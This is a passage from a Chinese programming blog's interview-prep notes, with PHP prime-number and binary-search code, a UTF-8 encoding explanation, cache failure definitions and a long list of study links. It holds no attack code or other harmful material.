= <span class="number">3</span>; $i &lt; $n; $i += <span class="number">2</span>) &#123;</span><br><span class="line">		$sqrt = intval(sqrt($i));</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">3</span>; $j &lt;= $sqrt; $j += <span class="number">2</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> ($i % $j == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($i &gt; $sqrt) &#123;</span><br><span class="line">			array_push($prime, $i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $prime;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取所有的质数</span></span><br><span class="line"><span class="comment"> * @param array $arr</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_prime_number</span>(<span class="params">$arr = []</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 质数数组</span></span><br><span class="line">    $primeArr = [];</span><br><span class="line">    <span class="comment">// 循环所有备选数</span></span><br><span class="line">    foreach ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="comment">// 备选数和备选数的中间数以下的数字整除比较</span></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt;= floor($value / <span class="number">2</span>); $i++) &#123;</span><br><span class="line">            <span class="comment">// 能够整除，则不是质数，退出循环</span></span><br><span class="line">            <span class="keyword">if</span> ($value % $i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 被除数$j比备选数的中间数大的则为质数</span></span><br><span class="line">        <span class="comment">// 这样判断的依据：</span></span><br><span class="line">        <span class="comment">// 假如备选数为质数，则内层的for循环不会break退出，则执行完毕，$i会继续+1，即最后$i = floor($value / 2) + 1</span></span><br><span class="line">        <span class="comment">// 假如备选数不为质数，则内层的for循环遇到整除就会break退出，$i不会继续+1，即最后$i &lt;= floor($value / 2)</span></span><br><span class="line">        <span class="keyword">if</span> ($value != <span class="number">1</span> &amp;&amp; $i &gt; floor($value / <span class="number">2</span>)) &#123;</span><br><span class="line">            $primeArr[] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $primeArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取所有的质数</span></span><br><span class="line"><span class="comment"> * @param array $arr</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_prime_number</span>(<span class="params">$arr = []</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 质数数组</span></span><br><span class="line">    $primeArr = [];</span><br><span class="line">    <span class="comment">// 循环所有备选数</span></span><br><span class="line">    foreach ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="comment">// 备选数和备选数的中间数以下的数字整除比较</span></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt;= floor($value / $i); $i++) &#123;</span><br><span class="line">            <span class="comment">// 能够整除，则不是质数，退出循环</span></span><br><span class="line">            <span class="keyword">if</span> ($value % $i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 被除数$j比备选数的中间数大的则为质数</span></span><br><span class="line">        <span class="comment">// 这样判断的依据：</span></span><br><span class="line">        <span class="comment">// 假如备选数为质数，则内层的for循环不会break退出，则执行完毕，$i会继续+1，即最后$i = floor($value / $i) + 1</span></span><br><span class="line">        <span class="comment">// 假如备选数不为质数，则内层的for循环遇到整除就会break退出且$i不会继续+1，即最后$i &lt;= floor($value / $i)</span></span><br><span class="line">        <span class="keyword">if</span> ($value != <span class="number">1</span> &amp;&amp; $i &gt; floor($value / $i)) &#123;</span><br><span class="line">            $primeArr[] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $primeArr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取所有的质数</span></span><br><span class="line"><span class="comment"> * @param array $arr</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_prime_number_three</span>(<span class="params">$arr = []</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 质数数组</span></span><br><span class="line">    $primeArr = $arr;</span><br><span class="line">    <span class="comment">// 循环所有备选数</span></span><br><span class="line">    foreach ($primeArr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($value == <span class="number">1</span>) &#123;</span><br><span class="line">            unset($primeArr[$key]);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 备选数和备选数的中间数以下的数字整除比较</span></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">2</span>; $i &lt;= floor($value / $i); $i++) &#123;</span><br><span class="line">            <span class="comment">// 能够整除，则不是质数，从数组中删除且退出循环</span></span><br><span class="line">            <span class="keyword">if</span> ($value % $i == <span class="number">0</span>) &#123;</span><br><span class="line">                unset($primeArr[$key]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 重置数组索引返回</span></span><br><span class="line">    <span class="keyword">return</span> array_values($primeArr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 所有备选数数组</span></span><br><span class="line">$numberArr = range(<span class="number">1</span>, <span class="number">100</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 获取备选数中的所有质数</span></span><br><span class="line">$primeNumberArr = get_prime_number($numberArr);</span><br><span class="line"><span class="comment">// 输出打印</span></span><br><span class="line">print_r($primeNumberArr);</span><br><span class="line"><span class="comment">// 所有备选数数组</span></span><br><span class="line">$numberArr = [<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">99</span>];</span><br><span class="line"><span class="comment">// 获取备选数中的所有质数</span></span><br><span class="line">$primeNumberArr = get_prime_number($numberArr);</span><br><span class="line"><span class="comment">// 输出打印http://blog.y0701.com/2018/09/18/PHP%E7%AE%97%E6%B3%95%E4%B9%8B%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%98%AF%E8%B4%A8%E6%95%B0/</span></span><br><span class="line">print_r($primeNumberArr);</span><br></pre></td></tr></table></figure>
<h3 id="PHP算法之二分查找"><a href="#PHP算法之二分查找" class="headerlink" title="PHP算法之二分查找"></a>PHP算法之二分查找</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 二分查找算法</span></span><br><span class="line"><span class="comment"> * @param array $arr 待查找区间</span></span><br><span class="line"><span class="comment"> * @param int $number 查找数</span></span><br><span class="line"><span class="comment"> * @return int        返回找到的键</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binary_search</span>(<span class="params">$arr, $number</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 非数组或者数组为空，直接返回-1</span></span><br><span class="line">    <span class="keyword">if</span> (!is_array($arr) || empty($arr)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始变量值</span></span><br><span class="line">    $len = count($arr);</span><br><span class="line">    $lower = <span class="number">0</span>;</span><br><span class="line">    $high = $len - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 最低点比最高点大就退出</span></span><br><span class="line">    <span class="keyword">while</span> ($lower &lt;= $high) &#123;</span><br><span class="line">        <span class="comment">// 以中间点作为参照点比较</span></span><br><span class="line">        $middle = intval(($lower + $high) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> ($arr[$middle] &gt; $number) &#123;</span><br><span class="line">            <span class="comment">// 查找数比参照点小，舍去右边</span></span><br><span class="line">            $high = $middle - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($arr[$middle] &lt; $number) &#123;</span><br><span class="line">            <span class="comment">// 查找数比参照点大，舍去左边</span></span><br><span class="line">            $lower = $middle + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 查找数与参照点相等，则找到返回</span></span><br><span class="line">            <span class="keyword">return</span> $middle;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 未找到，返回-1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param array $arr 待查找区间</span></span><br><span class="line"><span class="comment"> * @param int $number 查找数</span></span><br><span class="line"><span class="comment"> * @param int $lower 区间最低点</span></span><br><span class="line"><span class="comment"> * @param int $high 区间最高点</span></span><br><span class="line"><span class="comment"> * @return int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binary_search_recursion</span>(<span class="params">&amp;$arr, $number, $lower, $high</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 以区间的中间点作为参照点比较</span></span><br><span class="line">    $middle = intval(($lower + $high) / <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// 最低点比最高点大就退出</span></span><br><span class="line">    <span class="keyword">if</span> ($lower &gt; $high) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($number &gt; $arr[$middle]) &#123;</span><br><span class="line">        <span class="comment">// 查找数比参照点大，舍去左边继续查找</span></span><br><span class="line">        <span class="keyword">return</span> binary_search_recursion($arr, $number, $middle + <span class="number">1</span>, $high);</span><br><span class="line">    &#125; elseif ($number &lt; $arr[$middle]) &#123;</span><br><span class="line">        <span class="comment">// 查找数比参照点小，舍去右边继续查找</span></span><br><span class="line">        <span class="keyword">return</span> binary_search_recursion($arr, $number, $lower, $middle - <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $middle;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 待查找区间</span></span><br><span class="line">$arr = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">63</span>, <span class="number">99</span>];</span><br><span class="line"><span class="comment">// 非递归查找66所在的位置</span></span><br><span class="line">$find_key = binary_search($arr, <span class="number">57</span>);</span><br><span class="line"><span class="comment">// 递归查找66所在的位置</span></span><br><span class="line">$find_key_r = binary_search_recursion($arr, <span class="number">57</span>, <span class="number">0</span>, count($arr));</span><br><span class="line"><span class="comment">// 输出打印</span></span><br><span class="line">print_r($find_key);</span><br><span class="line">print_r($find_key_r);http:<span class="comment">//blog.y0701.com/2018/09/20/PHP%E7%AE%97%E6%B3%95%E4%B9%8B%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</span></span><br></pre></td></tr></table></figure>
<h3 id="UTF-8编码"><a href="#UTF-8编码" class="headerlink" title="UTF-8编码"></a>UTF-8编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。</span><br><span class="line"></span><br><span class="line">汉字”严”的unicode是十六进制数<span class="number">4E25</span>，转换成二进制数足足有<span class="number">15</span>位（<span class="number">100111000100101</span>），也就是说这个符号的表示至少需要<span class="number">2</span>个字节。表示其他更大的符号，可能需要<span class="number">3</span>个字节或者<span class="number">4</span>个字节，甚至更多。</span><br><span class="line"></span><br><span class="line">UTF<span class="number">-8</span>就是在互联网上使用最广的一种Unicode的实现方式。其他实现方式还包括UTF<span class="number">-16</span>（字符用两个字节或四个字节表示）和UTF<span class="number">-32</span>（字符用四个字节表示），不过在互联网上基本不用。重复一遍，这里的关系是，UTF<span class="number">-8</span>是Unicode的实现方式之一。</span><br><span class="line"></span><br><span class="line">UTF<span class="number">-8</span>最大的一个特点，就是它是一种变长的编码方式。它可以使用<span class="number">1</span>~<span class="number">4</span>个字节表示一个符号，根据不同的符号而变化字节长度。</span><br><span class="line">Unicode转义字符让我们可以通过Unicode码点输入特殊的字符。 有两种形式：\uhhhh对应<span class="number">16</span>bit的码点值， \Uhhhhhhhh对应<span class="number">32</span>bit的码点值， 其中h是一个十六进制数字；一般很少需要使用<span class="number">32</span>bit的形式。 每一个对应码点的UTF8编码。 例如：下面的字母串面值都表示相同的值：</span><br><span class="line"> </span><br><span class="line"><span class="string">"世界"</span></span><br><span class="line"><span class="string">"\xe4\xb8\x96\xe7\x95\x8c"</span></span><br><span class="line"><span class="string">"\u4e16\u754c"</span></span><br><span class="line"><span class="string">"\U00004e16\U0000754c"</span></span><br><span class="line">上面三个转义序列都为第一个字符串提供替代写法， 但是它们的值都是相同的。</span><br><span class="line">打开”记事本”程序Notepad.exe，新建一个文本文件，内容就是一个”严”字，依次采用ANSI，Unicode，Unicode big endian 和 UTF<span class="number">-8</span>编码方式保存。</span><br><span class="line">然后，用文本编辑软件UltraEdit中的”十六进制功能”，观察该文件的内部编码方式。</span><br><span class="line"></span><br><span class="line">ANSI：文件的编码就是两个字节”D1 CF”，这正是”严”的GB2312编码，这也暗示GB2312是采用大头方式存储的。</span><br><span class="line">Unicode：编码是四个字节”FF FE <span class="number">25</span> <span class="number">4</span>E”，其中”FF FE”表明是小头方式存储，真正的编码是<span class="number">4E25</span>。</span><br><span class="line">Unicode big endian：编码是四个字节”FE FF <span class="number">4</span>E <span class="number">25</span>″，其中”FE FF”表明是大头方式存储。</span><br><span class="line">UTF<span class="number">-8</span>：编码是六个字节”EF BB BF E4 B8 A5″，前三个字节”EF BB BF”表示这是UTF<span class="number">-8</span>编码，后三个”E4B8A5″就是”严”的具体编码，它的存储顺序与编码顺序是一致的。</span><br><span class="line">注意，windows下通过记事本保存的utf8默认是带BOM的utf，而一般建议都是使用不带BOM的utf8编码https:<span class="comment">//xin053.github.io/2016/09/07/UTF-8%E7%BC%96%E7%A0%81/</span></span><br></pre></td></tr></table></figure>
<h3 id="缓存穿透缓存击穿缓存雪崩"><a href="#缓存穿透缓存击穿缓存雪崩" class="headerlink" title="缓存穿透缓存击穿缓存雪崩"></a>缓存穿透缓存击穿缓存雪崩</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">缓存穿透 ： DB 承受了没有必要的查询流量，意思就是查到空值的时候没有做缓存处理，再次查询的时候继续读库了</span><br><span class="line">缓存击穿：热点 Key，大量并发读请求引起的小雪崩， 就是缓存在某个时间点过期的时候，恰好在这个时间点对这个 Key 有大量的并发请求过来，这些请求发现缓存过期一般都会从后端 DB 加载数据并回设到缓存，这个时候大并发的请求可能会瞬间把后端 DB 压垮</span><br><span class="line">缓存雪崩：缓存设置同一过期时间，引发的大量的读取数据库操作</span><br></pre></td></tr></table></figure>
<h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://learnku.com/articles/39504" target="_blank" rel="noopener">python 后端开发面经</a></p>
<p><a href="https://www.kancloud.cn/explore" target="_blank" rel="noopener">看云文档</a></p>
<p><a href="https://learnku.com/php/t/38272" target="_blank" rel="noopener">PHP 面试题和答案</a></p>
<p><a href="https://www.kancloud.cn/kancloud/a-programmer-prepares/78223" target="_blank" rel="noopener">程序员的自我修养</a></p>
<p><a href="https://github.com/wudi/PHP-Interview-Best-Practices-in-China" target="_blank" rel="noopener">PHP 面试知识点汇总</a></p>
<p><a href="https://learnku.com/articles/25837" target="_blank" rel="noopener">正向代理为客户端做代理，反向代理为服务器做代理</a></p>
<p><a href="https://juejin.im/post/5ac05aab6fb9a028e25db037" target="_blank" rel="noopener">计算机网络知识总结</a></p>
<p><a href="https://juejin.im/post/5ac49b5c518825556e5e5060" target="_blank" rel="noopener">排序算法全总结</a></p>
<p><a href="https://juejin.im/post/5ad6e4066fb9a028d82c4b66" target="_blank" rel="noopener">面试中关于Redis的问题看这篇就够了</a></p>
<p><a href="https://juejin.im/post/5b192314e51d45067d407822" target="_blank" rel="noopener">Mysql锁机制简单了解一下</a></p>
<p><a href="https://juejin.im/post/5c1731466fb9a049af6d2a83" target="_blank" rel="noopener">消息队列其实很简单</a></p>
<p><a href="https://juejin.im/post/5ba591386fb9a05cd31eb85f" target="_blank" rel="noopener">一份最适合你的后端面试指南</a></p>
<p><a href="https://juejin.im/post/5b4977ae5188251b146b2fc8" target="_blank" rel="noopener">面试必备之乐观锁与悲观锁</a></p>
<p><a href="https://juejin.im/post/5b7be0b2e51d4538db34a51e" target="_blank" rel="noopener">搞定计算机网络面试，看这篇就够了</a></p>
<p><a href="https://juejin.im/post/5b59c9f6e51d4535a65add84" target="_blank" rel="noopener">程序员简历之道</a></p>
<p><a href="https://juejin.im/post/5b3b19856fb9a04fa42f8c71" target="_blank" rel="noopener">前端&amp;后端程序员必备的Linux基础知识</a></p>
<p><a href="https://github.com/Snailclimb/programmer-advancement" target="_blank" rel="noopener">技术人员成长必备！</a></p>
<p><a href="https://juejin.im/post/5b2dffb851882574eb598896" target="_blank" rel="noopener">技术面试中常见的几道智力题 </a></p>
<p><a href="https://juejin.im/post/5b24cf7e51882574c020bd56" target="_blank" rel="noopener">关于MySQL的知识点与面试常见问题都在这里</a></p>
<p><a href="https://github.com/Snailclimb/JavaGuide" target="_blank" rel="noopener">一份涵盖大部分Java程序员所需要掌握的核心知识</a></p>
<p><a href="https://github.com/chunlintang/interview" target="_blank" rel="noopener">php面试</a></p>
<p><a href="https://www.qingwei.tech/somehub/" target="_blank" rel="noopener">图标生成器</a></p>
<p><a href="https://www.qingwei.tech/programe-develops/1171.html" target="_blank" rel="noopener">程序猿面试应知道的8种数据结构</a></p>
<p><a href="https://juejin.im/post/5c368a7df265da612e28d5c7" target="_blank" rel="noopener">历经 20 天，我终于完成了这份专为程序员编写的英语学习指南</a></p>
<p><a href="https://learnku.com/articles/27430#topnav" target="_blank" rel="noopener">如何”有计划，高效率，优简历”应对面试</a></p>
<p><a href="https://wdxtub.com/interview/14520847747820.html" target="_blank" rel="noopener">小土刀的面试刷题笔记</a></p>
<p><a href="https://segmentfault.com/a/1190000018378234" target="_blank" rel="noopener">我本以为你们会写简历</a></p>
<p> <a href="https://learnku.com/articles/27738#topnav" target="_blank" rel="noopener">《数据结构与算法之美》复杂度分析</a></p>
<p><a href="https://haoruijie.art/2019/04/02/book-soft-skill-review.html" target="_blank" rel="noopener">《软技能：代码之外的生存准则》读后感</a></p>
<p><a href="https://juejin.im/post/5c96fb795188252d5f0fdff2?utm_source=coffeephp.com" target="_blank" rel="noopener">Redis和mysql数据怎么保持数据一致的</a></p>
<p><a href="https://segmentfault.com/a/1190000011405320" target="_blank" rel="noopener">Nginx高并发下的优化</a></p>
<p><a href="https://github.com/HIT-Alibaba/interview" target="_blank" rel="noopener">笔试面试知识整理</a></p>
<p><a href="https://learnku.com/laravel/t/6138/share-some-of-the-problems-that-larvel-and-phper-interviews-may-encounter" target="_blank" rel="noopener">PHPer 面试可能会遇到的问题</a></p>
<p><a href="https://learnku.com/articles/25842" target="_blank" rel="noopener">画江湖之算法篇【排序算法】冒泡排序</a></p>
<p><a href="https://www.imooc.com/learn/696" target="_blank" rel="noopener">从零开始打造自己的PHP框架 </a></p>
<p><a href="https://github.com/nonfu/laravel-tutorial-code" target="_blank" rel="noopener">Laravel 从入门到精通教程代码</a></p>
<p><a href="https://laravelacademy.org/laravel-tutorial-5_7" target="_blank" rel="noopener">Laravel 从入门到精通系列教程</a></p>
<p><a href="https://laravelacademy.org/programmer-internal-skills-series" target="_blank" rel="noopener">程序员内功修炼系列 2019 版</a></p>
<p><a href="https://github.com/xianyunyh/PHP-Interview" target="_blank" rel="noopener"> PHP 面试的资料</a></p>
<p><a href="https://learnku.com/articles/17867" target="_blank" rel="noopener">简聊 Session 与 Token 身份验证</a></p>
<p><a href="https://learnku.com/articles/25814" target="_blank" rel="noopener">画江湖之数据结构【第二话:队列】队列</a></p>
<p><a href="https://learnku.com/articles/22363" target="_blank" rel="noopener">面试前必须要知道的 Redis 面试内容</a></p>
<p><a href="https://learnku.com/articles/20031" target="_blank" rel="noopener">【简易图解】『 OAuth2.0』 猴子都能懂的图解</a></p>
<p><a href="https://learnku.com/articles/25070#topnav" target="_blank" rel="noopener">面试之 Redis 基础、高级特性与性能调优</a></p>
<p><a href="https://learnku.com/articles/22538" target="_blank" rel="noopener">收集的干货，持续更新</a></p>
<p><a href="https://segmentfault.com/a/1190000018447170?utm_source=tag-newest" target="_blank" rel="noopener">PHP面试常考之设计模式——建造者模式</a></p>
<p><a href="https://learnku.com/articles/25252#topnav" target="_blank" rel="noopener">PHP 详细面试总结 (二 HTTP 请求全过程)</a></p>
<p><a href="https://www.fanhaobai.com/2017/09/lua.html" target="_blank" rel="noopener">lua</a></p>
<p><a href="https://learnku.com/articles/26686" target="_blank" rel="noopener">代理与反向代理、负载均衡和缓存</a></p>
<p><a href="https://segmentfault.com/a/1190000018464303?utm_source=tag-newest" target="_blank" rel="noopener">PHP-FPM 与 Nginx 的通信机制总结</a></p>
<p><a href="http://fanqieto.top/2018/08/03/%E4%BB%8E%E4%B8%80%E9%81%93%E7%99%BE%E5%BA%A6%E9%9D%A2%E8%AF%95%E9%A2%98%E8%AF%B4%E8%B5%B7/" target="_blank" rel="noopener">从一道百度面试题说起</a></p>
<p><a href="http://fanqieto.top/2018/07/26/%E7%AC%94%E8%AF%95%E9%9D%A2%E8%AF%95%E5%B8%B8%E7%94%A8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">笔试面试常用排序算法总结</a></p>
<p><a href="https://learnku.com/articles/25204" target="_blank" rel="noopener">PHP 详细面试总结</a></p>
<p><a href="http://fanqieto.top/2018/06/23/%E9%9D%A2%E8%AF%95%E7%9A%84%E6%8A%80%E5%B7%A7%EF%BC%88%E4%B8%8A%EF%BC%89%EF%BC%9A%E5%90%AC%E6%87%82%E5%88%AB%E4%BA%BA%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">面试的技巧（上）：听懂别人的问题</a></p>
<p><a href="http://fanqieto.top/2018/06/17/%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98%E5%85%B6%E5%AE%9E%E6%9C%80%E5%B8%B8%E8%A7%81/" target="_blank" rel="noopener">leetcode题解（数组问题）</a></p>
<p><a href="http://fanqieto.top/2018/06/14/%E7%AE%97%E6%B3%95%E9%9D%A2%E8%AF%95%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC/" target="_blank" rel="noopener">如何准备算法面试</a></p>
<p><a href="http://fanqieto.top/2017/10/12/%E9%AB%98%E5%B9%B6%E5%8F%91%E4%B8%8B%E7%BB%99%E6%95%B0%E6%8D%AE%E5%BA%93%E6%80%A7%E8%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%E5%BD%B1%E5%93%8D/" target="_blank" rel="noopener">高并发下给数据库性能有哪些影响？</a></p>
<p><a href="http://blog.thankbabe.com/2018/05/23/shared-experience/#top" target="_blank" rel="noopener">大话后端开发的奇淫技巧大集合</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/26175433" target="_blank" rel="noopener">聪明人应该如何背英语单词？</a></p>
<p><a href="http://www.sangeng.org/blog/detail_563.html" target="_blank" rel="noopener">20K+的高级PHP面试题汇总</a></p>
<p><a href="https://mp.weixin.qq.com/s/OzAnRVPUDtoiIXqeC7YL6g" target="_blank" rel="noopener">阿里云Redis开发规范 </a></p>
<p><a href="https://www.cnblogs.com/walblog/articles/8476579.html" target="_blank" rel="noopener">php解决高并发问题</a></p>
<p><a href="https://learnku.com/laravel/t/24359" target="_blank" rel="noopener">面试最让你手足无措的一个问题：你的系统如何支撑高并发</a></p>
<p><a href="https://learnku.com/articles/25879" target="_blank" rel="noopener">面试 (MySQL 索引为啥要选择 B+ 树)</a></p>
<p><a href="https://github.com/XiaoMi/soar/blob/master/doc/heuristic.md" target="_blank" rel="noopener">MySQL 避坑宝典</a></p>
<p><a href="https://learnku.com/articles/24795#topnav" target="_blank" rel="noopener">深入 Nginx 之配置篇</a></p>
<p><a href="https://learnku.com/articles/28716" target="_blank" rel="noopener">PHP 面试踩过的坑</a></p>
<p><a href="https://learnku.com/articles/28772" target="_blank" rel="noopener">PHP 面试详解之技术篇</a></p>
<p><a href="http://blog.y0701.com/2018/09/11/PHP%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">PHP面试总结</a></p>
<p><a href="https://github.com/duiying/php-notes" target="_blank" rel="noopener">记录开发或面试中可能遇到的知识点</a></p>
<p><a href="http://qinghua.github.io/encoding-and-escaping/" target="_blank" rel="noopener">程序员常见的编码和转义</a></p>
<p><a href="https://betacat.online/posts/2019-01-25/what-happens-when-you-type-googlecom-into-your-browser-and-return/" target="_blank" rel="noopener">当你在浏览器中输入“google.com”并回车，会发生什么</a></p>
<p><a href="https://betacat.online/posts/2019-02-22/reverse-proxy-and-intranet-through/" target="_blank" rel="noopener">反向代理和内网穿透frp ngrok</a></p>
<p><a href="https://learnku.com/articles/29685" target="_blank" rel="noopener">TCP 协议简单说明</a></p>
<p><a href="https://learnku.com/articles/28896" target="_blank" rel="noopener">最近去腾讯面试了，分享一波面试题</a></p>
<p><a href="https://github.com/xianyunyh/PHP-Interview" target="_blank" rel="noopener">PHP面试准备的资料</a></p>
<p><a href="https://learnku.com/articles/21993#replies" target="_blank" rel="noopener">2019年小米春季上海 PHP 实习生招聘面试题</a></p>
<p><a href="https://github.com/0voice/interview_internal_reference" target="_blank" rel="noopener">2019年最新总结，阿里，腾讯，百度，美团，头条等技术面试题目</a></p>
<p><a href="https://github.com/guanhui07/studyFiles" target="_blank" rel="noopener">一些电子书pdf</a></p>
<p><a href="https://learnku.com/articles/33612" target="_blank" rel="noopener">php面试</a></p>
<p><a href="https://learnku.com/articles/33806" target="_blank" rel="noopener">PHP 三年模拟五年面试之一网打尽系列（4）—– MySQL 高级</a></p>
<p><a href="https://learnku.com/articles/35779" target="_blank" rel="noopener">整理有关面试普遍问题和回答技巧</a></p>
<p><a href="https://learnku.com/articles/36719" target="_blank" rel="noopener">到底该学习什么编程语言</a></p>
<p><a href="https://learnku.com/articles/32343#replies" target="_blank" rel="noopener">PHP7 底层运行机制</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

